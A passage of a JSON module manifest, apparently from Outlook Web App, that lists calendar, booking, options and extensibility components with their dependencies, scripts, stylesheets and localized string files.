}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.calsurfacestrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.meetingmsgstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["calendarsurface"]},"meetingmessage":{"Dependencies":["boot","deferredboot","mailcommon","calendarwebservices","calendarcore","editor","peoplecore","personacontrol"],"Types":["_db.Y","_y.fQ","_y.jh","_cc.dk","_y.jf","_mco.bg"],"Templates":["LocationView"],"Styles":[{"layout":"Mouse","name":"mmsprite1.mouse.css","type":"Sprite"},{"layout":"Mouse","name":"meetingmessage.mouse.css","type":"Themed"}],"Configurations":[{"type":"MeetingMessageComponent"}],"Sources":[{"name":"microsoft.owa.calendar.meetingmessage.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.calmfstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.meetingmsgstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.commonstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.nonbootstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["meetingmessage"]},"mailcommon":{"Dependencies":["boot","deferredboot","nonbootwebservices"],"Types":[],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.mail.common.mouse.css","type":"Themed"}],"Configurations":[{"type":"MailCommonComponent"}],"Sources":[{"name":"microsoft.owa.mail.common.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.nonbootstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["mailcommon"]},"calendarpeek":{"Dependencies":["calendarcore","boot","deferredboot","calendarwebservices","recipientwell","peoplecore","personacontrol","findpeople","calendarmeetingforms","meetingmessage","calendarsurface"],"Types":["_cb.cb","_cb.bF","_cc.bI"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.calendar.peek.mouse.css","type":"Themed"}],"Configurations":[{"type":"CalendarPeekComponent"}],"Sources":[{"name":"microsoft.owa.calendar.surface.core.js"},{"name":"microsoft.owa.calendar.surface.core.mouse.js"},{"name":"microsoft.owa.calendar.peek.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.calpeekstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.commonstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["calendarpeek"]},"feeds":{"Dependencies":["deferredboot","calendarwebservices","calendarcore","calendarcontrols","lightning","frepanel"],"Types":["_cc.cO","_y.hr"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.calendar.feeds.mouse.css","type":"Themed"}],"Configurations":[{"type":"FeedsComponent"}],"Sources":[{"name":"microsoft.owa.calendar.feeds.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.owa.calendar.feeds.calendarfeedsstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["feeds"]},"holidays":{"Dependencies":["deferredboot","calendarwebservices","calendarcore","calendarcontrols"],"Types":["_cc.cP"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.calendar.holidays.mouse.css","type":"Themed"}],"Configurations":[{"type":"HolidaysComponent"}],"Sources":[{"name":"microsoft.owa.calendar.holidays.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.holidaystrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["holidays"]},"calendarsharingmanagement":{"Dependencies":["calendarwebservices","attachments","boot","deferredboot","calendarmeetingforms","calendarcore","calendarsurface","peoplecore","recipientwell","personacontrol","findpeople"],"Types":["_db.bk","_y.bG","_cc.dq","_y.eC","_cc.by"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.calendar.sharing.management.v2.mouse.css","type":"Themed"}],"Configurations":[{"type":"CalendarSharingManagementComponentV2"}],"Sources":[{"name":"microsoft.owa.calendar.sharing.management.v2.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.calendar.sm.strs.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.commonstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["calendarsharingmanagement"]},"calendarsharingmessage":{"Dependencies":["deferredboot","calendarwebservices","calendarcore"],"Types":["_mco.F"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.calendar.sharing.message.mouse.css","type":"Themed"}],"Configurations":[{"type":"CalendarSharingMessageComponent"}],"Sources":[{"name":"microsoft.owa.calendar.sharing.message.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.calendar.sm.strs.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["calendarsharingmessage"]},"calendarprint":{"Dependencies":["deferredboot","calendarsurface"],"Types":["_cb.cg"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.calendar.print.v2.mouse.css","type":"Themed"}],"Configurations":[{"type":"CalendarPrintComponentV2"}],"Sources":[{"name":"microsoft.owa.calendar.print.v2.js"},{"name":"printelement.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["calendarprint"]},"locationwell":{"Dependencies":["deferredboot","deferredwebservices","calendarwebservices","recipientwell","findpeople","calendarcore","addroom","locationcommon"],"Types":["_cc.X","_cc.eJ"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.calendar.locationwell.mouse.css","type":"Themed"}],"Configurations":[{"type":"CalendarLocationWellComponent"}],"Sources":[{"name":"microsoft.owa.calendar.locationwell.js"},{"name":"microsoft.owa.calendar.locationwell.mouse.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.callwstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["locationwell"]},"calendartimesuggestions":{"Dependencies":["boot","deferredwebservices","calendarwebservices","calendarcore"],"Types":["_cc.cI"],"Templates":["TimeSuggestionsView"],"Styles":[{"layout":"Mouse","name":"microsoft.owa.calendar.timesuggestions.mouse.css","type":"Themed"}],"Configurations":[{"type":"CalendarTimeSuggestionsComponent"}],"Sources":[{"name":"microsoft.owa.calendar.timesuggestions.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.caltsstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["calendartimesuggestions"]},"consensusscheduling":{"Dependencies":["calendarsurface","mailcommon","calendarscheduling","personacontrol"],"Types":["_mco.m","_mco.Z"],"Templates":["ConsensusSchedulingView","ConsensusSchedulingDatePickerView"],"Styles":[{"layout":"Mouse","name":"microsoft.owa.calendar.consensus.mouse.css","type":"Themed"}],"Configurations":[{"type":"ConsensusSchedulingComponent"}],"Sources":[{"name":"microsoft.owa.calendar.consensus.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.owa.calendar.consensus.strings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["consensusscheduling"]},"calendarcompose":{"Dependencies":["calendarcore","calendarcontrols","boot","deferredboot","calendarwebservices","recipientwell","peoplecore","personacontrol","findpeople","calendarmeetingforms","commoncompose","editor","locationwell","meetingmessage","addroom","lightning"],"Types":["_bc.l","_bc.r"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.calendar.compose.mouse.css","type":"Themed"}],"Configurations":[{"type":"CalendarComposeComponent"}],"Sources":[{"name":"microsoft.owa.calendar.compose.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.calcompstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.commonstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["calendarcompose"]},"calendarreadingpane":{"Dependencies":["calendarcore","boot","deferredboot","nonbootwebservices","recipientwell","personacontrol","calendarmeetingforms","meetingmessage","mailcommon"],"Types":["_db.n"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.calendar.readingpane.mouse.css","type":"Themed"}],"Configurations":[{"type":"CalendarReadingPaneComponent"}],"Sources":[{"name":"microsoft.owa.calendar.readingpane.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.calreadstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.commonstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["calendarreadingpane"]},"calendarplaces":{"Dependencies":["calendarcore","boot","deferredboot","calendarwebservices","peoplecore","personacontrol","calendarmeetingforms","personacardfacade","recipientwell","readpersoncard","locationcommon"],"Types":["_cc.dn","_db.bm","_cc.dm","_db.bV"],"Templates":["LocationPanelView","BingMap"],"Styles":[{"layout":"Mouse","name":"clsprite1.mouse.css","type":"Sprite"},{"layout":"Mouse","name":"microsoft.owa.calendar.places.mouse.css","type":"Themed"}],"Configurations":[{"type":"CalendarPlacesComponent"}],"Sources":[{"name":"microsoft.owa.calendar.places.js"},{"layout":"Mouse","name":"microsoft.owa.calendar.places.mouse.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.calplacesstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.commonstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["calendarplaces"]},"calendarscheduling":{"Dependencies":["calendarcore","boot","deferredboot","nonbootwebservices","recipientwell","peoplecore","personacontrol","findpeople","calendarmeetingforms","calendarpeek","calendarsurface","calendarcontrols","meetingmessage"],"Types":["_cc.eK","_cc.bZ"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.calendar.scheduling.v2.mouse.css","type":"Themed"}],"Configurations":[{"type":"CalendarSchedulingComponentV2"}],"Sources":[{"name":"microsoft.owa.calendar.scheduling.v2.js"},{"layout":"Mouse","name":"microsoft.owa.calendar.scheduling.v2.mouse.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.calschedstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.commonstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["calendarscheduling"]},"smartsuggestions":{"Dependencies":["editor","commoncompose"],"Types":["_cmc.Q"],"Templates":["SmartSuggestionsPaneContentView"],"Styles":[{"layout":"Mouse","name":"microsoft.owa.smartsuggestions.mouse.css","type":"Themed"}],"Configurations":[{"layout":"Mouse","type":"SmartSuggestionsComponent"}],"Sources":[{"layout":"Mouse","name":"microsoft.owa.smartsuggestions.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.owa.smartsuggestions.strings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["smartsuggestions"]},"userhighlighting":{"Dependencies":["mailcommon","commoncompose"],"Types":["_mco.bb"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.core.userhighlighting.mouse.css","type":"Themed"}],"Configurations":[{"type":"UserHighlightingComponent"}],"Sources":[{"name":"microsoft.owa.core.userhighlighting.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["userhighlighting"]},"curatedkeypoints":{"Dependencies":["mailcommon","commoncompose"],"Types":["_mco.ba"],"Templates":[],"Styles":[],"Configurations":[{"layout":"Mouse","type":"CuratedKeyPointsComponent"}],"Sources":[{"layout":"Mouse","name":"microsoft.owa.core.curatedkeypoints.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["curatedkeypoints"]},"inlineimagesupport":{"Dependencies":["deferredboot"],"Types":["_db.F"],"Templates":[],"Styles":[],"Configurations":[{"layout":"Mouse","type":"InlineImageSupportComponent"}],"Sources":[{"layout":"Mouse","name":"microsoft.owa.core.inlineimagesupport.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["inlineimagesupport"]},"naturalinput":{"Dependencies":["deferredwebservices","calendarsurface","calendarmeetingforms","locationwell"],"Types":["_cb.cq"],"Templates":["CalendarNaturalInputItem"],"Styles":[{"layout":"Mouse","name":"microsoft.owa.calendar.naturalinput.v2.mouse.css","type":"Themed"}],"Configurations":[{"type":"NaturalInputComponentV2"}],"Sources":[{"name":"microsoft.owa.calendar.naturalinput.v2.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.naturalinput.strings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["naturalinput"]},"weather":{"Dependencies":["calendarwebservices","calendarcore","locationcommon"],"Types":["_cc.j","_cc.dj","_y.hy","_cc.eb"],"Templates":["WeatherViewContainer","WeatherLocationSearchControl"],"Styles":[{"layout":"Mouse","name":"wsprite1.mouse.css","type":"Sprite"},{"layout":"Mouse","name":"microsoft.owa.calendar.weatherv2.mouse.css","type":"Themed"}],"Configurations":[{"type":"WeatherV2Component"}],"Sources":[{"name":"microsoft.owa.calendar.weatherv2.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.weather.strings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["weather"]},"birthdays":{"Dependencies":["deferredboot","calendarwebservices","calendarcontrols","calendarreadingpane"],"Types":["_db.bl","_cc.bg"],"Templates":["BirthdayPeekViewContainer","BirthdayDetailsViewContainer"],"Styles":[{"layout":"Mouse","name":"bdsprite1.mouse.css","type":"Sprite"},{"layout":"Mouse","name":"microsoft.owa.calendar.birthdays.mouse.css","type":"Themed"}],"Configurations":[{"type":"BirthdaysComponent"}],"Sources":[{"name":"microsoft.owa.calendar.birthdays.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.birthdays.strings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.commonstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["birthdays"]},"bookingcalendar":{"Dependencies":["boot","deferredboot","calendarwebservices","bookingcore","calendarcore","calendarcontrols","reminders","peoplecore","personacontrol","locationwell","calendarpeek","bookingcustomersmodule","photoupload","shellplus","calendartheming"],"Types":["_db.bz","_cc.ba","_cb.co","_cc.ce","_cc.cQ","_b1.v","_b1.E"],"Templates":[],"Styles":[{"layout":"Mouse","name":"bcsprite1.mouse.css","type":"Sprite"},{"layout":"Mouse","name":"microsoft.owa.calendar.booking.mouse.css","type":"Themed"}],"Configurations":[{"type":"BookingCalendarComponent"}],"Sources":[{"name":"microsoft.owa.calendar.booking.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.owa.calendar.booking.strings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.calcompstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.calmfstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.remindersstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["bookingcalendar"]},"schedules":{"Dependencies":["boot","deferredboot","calendarcore","calendarcontrols","calendarwebservices","calendartheming","meetingmessage","locationwell","lightning"],"Types":["_cc.bH","_sd.v","_y.hx"],"Templates":[],"Styles":[{"layout":"Mouse","name":"nbsprite1.mouse.css","type":"Sprite"},{"layout":"Mouse","name":"microsoft.owa.calendar.schedules.mouse.css","type":"Themed"}],"Configurations":[{"type":"SchedulesComponent"}],"Sources":[{"name":"microsoft.owa.calendar.schedules.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.owa.calendar.schedules.strings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["schedules"]},"bookingbusinesstypes":{"Dependencies":["boot","deferredboot","calendarwebservices","nonbootwebservices","bookingcalendar"],"Types":["_bk.bN"],"Templates":[],"Styles":[],"Configurations":[{"type":"BookingBusinessTypesComponent"}],"Sources":[{"name":"microsoft.owa.booking.businesstypes.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.owa.booking.businesstypes.strings.bt.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["bookingbusinesstypes"]},"bookingcore":{"Dependencies":["boot","deferredboot","lightning","peoplecore","personacontrol","calendarcore","deferredwebservices","calendarwebservices","analytics"],"Types":["_cc.cf","_y.hq"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.booking.core.mouse.css","type":"Themed"}],"Configurations":[{"type":"BookingCoreComponent"}],"Sources":[{"name":"microsoft.owa.booking.core.js"},{"name":"localytics.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.owa.booking.core.strings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["bookingcore"]},"bookingshell":{"Dependencies":["boot","deferredboot","calendarwebservices","bookingcore","calendarcore","peoplecore","personacontrol"],"Types":["_y.gm"],"Templates":[],"Styles":[{"layout":"Mouse","name":"booksprite1.mouse.css","type":"Sprite"},{"layout":"Mouse","name":"microsoft.owa.booking.shell.mouse.css","type":"Themed"}],"Configurations":[{"type":"BookingShellComponent"}],"Sources":[{"name":"microsoft.owa.booking.shell.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.owa.booking.shell.strings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["bookingshell"]},"bookingcalendarmodule":{"Dependencies":["boot","deferredboot","bookingcore","calendarcore","calendarsurface","bookingcalendar"],"Types":["_b1.x"],"Templates":[],"Styles":[],"Configurations":[{"type":"BookingCalendarModuleComponent"}],"Sources":[{"name":"microsoft.owa.booking.modules.calendar.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["bookingcalendarmodule"]},"bookinghomepagemodule":{"Dependencies":["boot","deferredboot","bookingcore"],"Types":["_b1.z"],"Templates":[],"Styles":[{"layout":"Mouse","name":"booksprite1.mouse.css","type":"Sprite"},{"layout":"Mouse","name":"microsoft.owa.booking.modules.homepage.mouse.css","type":"Themed"}],"Configurations":[{"type":"BookingHomePageComponent"}],"Sources":[{"name":"microsoft.owa.booking.modules.homepage.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["bookinghomepagemodule"]},"bookingcustomersmodule":{"Dependencies":["boot","deferredboot","bookingcore","peoplehub"],"Types":["_b1.y","_cu.c"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.booking.modules.customers.mouse.css","type":"Themed"}],"Configurations":[{"type":"BookingCustomersComponent"}],"Sources":[{"name":"microsoft.owa.booking.modules.customers.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["bookingcustomersmodule"]},"bookingpagemodule":{"Dependencies":["boot","deferredboot","bookingcore","calendarcore","bookingcalendar"],"Types":["_b1.A"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.booking.modules.bookingpage.mouse.css","type":"Themed"}],"Configurations":[{"type":"BookingPageComponent"}],"Sources":[{"name":"microsoft.owa.booking.modules.bookingpage.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["bookingpagemodule"]},"bookingbusinessinformationmodule":{"Dependencies":["boot","deferredboot","bookingcore","calendarcore","bookingcalendar"],"Types":["_b1.w"],"Templates":[],"Styles":[],"Configurations":[{"type":"BookingBusinessInformationComponent"}],"Sources":[{"name":"microsoft.owa.booking.modules.businessinformation.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["bookingbusinessinformationmodule"]},"bookingpaymentsmodule":{"Dependencies":["boot","deferredboot","bookingcore","bookingcalendar","bookingshell"],"Types":["_b1.B"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.booking.modules.payments.mouse.css","type":"Themed"}],"Configurations":[{"type":"BookingPaymentsComponent"}],"Sources":[{"name":"microsoft.owa.booking.modules.payments.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["bookingpaymentsmodule"]},"bookingservicesmodule":{"Dependencies":["boot","deferredboot","bookingcore","calendarcore","bookingcalendar"],"Types":["_b1.C"],"Templates":[],"Styles":[],"Configurations":[{"type":"BookingServicesComponent"}],"Sources":[{"name":"microsoft.owa.booking.modules.services.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["bookingservicesmodule"]},"bookingstaffmodule":{"Dependencies":["boot","deferredboot","bookingcore","calendarcore","bookingcalendar"],"Types":["_b1.D"],"Templates":[],"Styles":[],"Configurations":[{"type":"BookingStaffComponent"}],"Sources":[{"name":"microsoft.owa.booking.modules.staff.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["bookingstaffmodule"]},"tailoredexperiences":{"Dependencies":["boot","calendarcore","nonbootwebservices","mailcommon","recipientwell","lightning"],"Types":["_mco.t","_te.n","_h.cG"],"Templates":["ExtractedEventViewContainer","GroupedTailoredEntitiesView","ShareTailoredEventView","VerticalEntityView"],"Styles":[{"layout":"Mouse","name":"nbsprite1.mouse.css","type":"Sprite"},{"layout":"Mouse","name":"microsoft.owa.tailoredexperiences.mouse.css","type":"Themed"}],"Configurations":[{"type":"TailoredExperiencesComponent"}],"Sources":[{"name":"microsoft.owa.tailoredexperiences.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.testrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["tailoredexperiences"]},"connectors":{"Dependencies":["boot","mailcommon","extensibility","officepay","lightning","calendarcore"],"Types":["_y.db","_h.bB","_h.cR","_db.bj"],"Templates":["ConnectorsView","GroupedConnectorCardsView"],"Styles":[{"layout":"Mouse","name":"microsoft.owa.connectors.mouse.css","type":"Themed"},{"layout":"Mouse","name":"connectors_extension.mouse.css","type":"Themed"}],"Configurations":[{"type":"ConnectorsComponent"}],"Sources":[{"name":"microsoft.owa.connectors.js"},{"name":"purify.min.js"},{"name":"hashes.min.js"},{"name":"markdown-it.min.js"},{"name":"adaptive-cards.js"},{"name":"adaptive-card-render.js"},{"name":"adaptive-card-controls.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.connectorstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["connectors"]},"helpPanel":{"Dependencies":["nonbootwebservices","deferredboot"],"Types":["_y.hk"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.helppanel.mouse.css","type":"Themed"}],"Configurations":[{"type":"HelpPanelComponent"}],"Sources":[{"name":"microsoft.owa.helppanel.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.helppanelstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["helpPanel"]},"calendarsearchinput":{"Dependencies":["deferredboot","nonbootwebservices","calendarsurface","personacontrol"],"Types":["_y.eB"],"Templates":["CalendarSearchBox"],"Styles":[{"layout":"Mouse","name":"casprite1.mouse.css","type":"Sprite"},{"layout":"Mouse","name":"calendarsearchinput.mouse.css","type":"Themed"}],"Configurations":[{"type":"CalendarSearchInputComponentV2"}],"Sources":[{"name":"microsoft.owa.calendar.search.v2.input.js"},{"layout":"Mouse","name":"microsoft.owa.calendar.search.v2.input.mouse.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.csearch.strings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["calendarsearchinput"]},"calendarsearchoutput":{"Dependencies":["nonbootwebservices","calendarsearchinput","nonboot","calendarpicker","instantsearch","findpeople","deferredboot"],"Types":["_cb.by","_cb.cs","_cc.cH","_ci.s"],"Templates":[],"Styles":[{"layout":"Mouse","name":"calendarsearchoutput.mouse.css","type":"Themed"}],"Configurations":[{"type":"CalendarSearchOutputComponentV2"}],"Sources":[{"name":"microsoft.owa.calendar.search.v2.output.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["calendarsearchoutput"]},"reminders":{"Dependencies":["boot","deferredboot","calendarwebservices","personacontrol","calendarcore"],"Types":["_cc.cN","_cc.bn","_db.cs"],"Templates":["EmailRemindersView"],"Styles":[{"layout":"Mouse","name":"microsoft.owa.reminders.mouse.css","type":"Themed"}],"Configurations":[{"type":"RemindersComponent"}],"Sources":[{"name":"microsoft.owa.reminders.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.remindersstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.commonstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.calmfstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.nonbootstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["reminders"]},"optionscore":{"Dependencies":["nonbootwebservices","optionscoremodels","deferredboot"],"Types":["_y.fi","_y.hw","_y.eD"],"Templates":[],"Styles":[{"layout":"Mouse","name":"opsprite1.mouse.css","type":"Sprite"},{"layout":"Mouse","name":"microsoft.owa.options.core.mouse.css","type":"Themed"}],"Configurations":[{"type":"OptionsCoreComponent"}],"Sources":[{"name":"microsoft.owa.options.core.js"},{"layout":"Mouse","name":"microsoft.owa.options.core.mouse.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.commonstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.options.strings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["optionscore"]},"options":{"Dependencies":["nonbootwebservices","commoncompose","editor","personacontrol","calendarcontrols","peoplecore","optionscore","optionscoremodels","calendarcore","deferredboot","attachments","attachmentsfilepicker","offline","peoplehub","groupcard","triageshared"],"Types":["_opc.P","_opc.O"],"Templates":["OptionsPanelView"],"Styles":[{"layout":"Mouse","name":"microsoft.owa.options.mouse.css","type":"Themed"}],"Configurations":[{"type":"OptionsComponent"}],"Sources":[{"name":"microsoft.owa.options.js"},{"layout":"Mouse","name":"microsoft.owa.options.mouse.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.options.strings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["options"]},"calendaroptions":{"Dependencies":["deferredboot","calendarcore","calendarcontrols","peoplecore","optionscore","optionscoremodels","locationwell"],"Types":["_opc.N"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.options.calendar.mouse.css","type":"Themed"}],"Configurations":[{"type":"CalendarOptionsComponent"}],"Sources":[{"name":"microsoft.owa.options.calendar.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.options.strings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["calendaroptions"]},"optionscoremodels":{"Dependencies":["deferredwebservices","nonbootwebservices","deferredboot","calendarwebservices"],"Types":["_h.dp"],"Templates":[],"Styles":[],"Configurations":[{"type":"OptionsCoreModelsComponent"}],"Sources":[{"name":"microsoft.owa.options.core.models.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.options.strings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["optionscoremodels"]},"resources":{"Dependencies":[],"Types":[],"Templates":[],"Styles":[{"name":"moeerrorux.css","type":"NotThemed"},{"name":"moeerroruxrtl.css","type":"NotThemed"}],"Configurations":[],"Sources":[{"name":"microsoft.naturallanguage.clientruntime.js"},{"name":"microsoft.naturallanguage.attachmentres.en.js"},{"name":"blank.html"}],"PackagedSources":[],"Strings":[{"name":"osfruntime_strings.js","type":"Extensibility"}],"PackagedStrings":[],"IncludedSlabs":["resources"]},"nonbootcontrols":{"Dependencies":["deferredboot","lightning"],"Types":[],"Templates":["CommandingBarExternalImageItem","IconImage"],"Styles":[{"layout":"Mouse","name":"microsoft.owa.nonboot.controls.mouse.css","type":"Themed"}],"Configurations":[{"type":"NonBootControlsComponent"}],"Sources":[{"name":"microsoft.owa.nonboot.controls.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.extstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["nonbootcontrols"]},"extensibility":{"Dependencies":["deferredboot","lightning","nonbootcontrols","nonbootwebservices","personacontrol","mailcommon","react"],"Types":["_y.bB","_y.bT","_bc.D","_y.cu","_y.ef"],"Templates":["ComposeAppsPane","XExtensibilityView","XComposeExtensibilityView","XExtensibilityCardView","ExtensibilityReactComponent"],"Styles":[{"layout":"Mouse","name":"nbsprite1.mouse.css","type":"Sprite"},{"layout":"Mouse","name":"microsoft.owa.extensibilitynext.mouse.css","type":"Themed"}],"Configurations":[{"type":"ExtensibilityNextComponent"}],"Sources":[{"name":"adal.min.js"},{"name":"owa.clientnext.extensibility.js"},{"name":"osfruntime.js"},{"name":"microsoft.owa.extensibilitynext.js"},{"name":"microsoft.owa.extensibility.common.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.extstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["extensibility"]},"infobarnotifications":{"Dependencies":[],"Types":["_mco.z","_mco.Q","_mco.r"],"Templates":[],"Styles":[],"Configurations":[{"type":"InfoBarNotificationsComponent"}],"Sources":[{"name":"microsoft.owa.core.infobarnotifications.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["infobarnotifications"]},"infotips":{"Dependencies":["deferredboot","nonbootwebservices","recipientwell","findpeople"],"Types":["_y.cV","_y.du","_y.dt"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.infotips.mouse.css","type":"Themed"}],"Configurations":[{"type":"InfoTipsComponent"}],"Sources":[{"name":"microsoft.owa.infotips.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.nonbootstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["infotips"]},"forgottenattachment":{"Dependencies":["nonbootwebservices"],"Types":["_y.dW"],"Templates":[],"Styles":[],"Configurations":[{"type":"ForgottenAttachmentComponent"}],"Sources":[{"name":"microsoft.naturallanguage.clientruntime.js"},{"name":"microsoft.naturallanguage.attachmentres.en.js"},{"name":"microsoft.owa.forgottenattachment.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.nonbootstrings.localized.min.js"}],"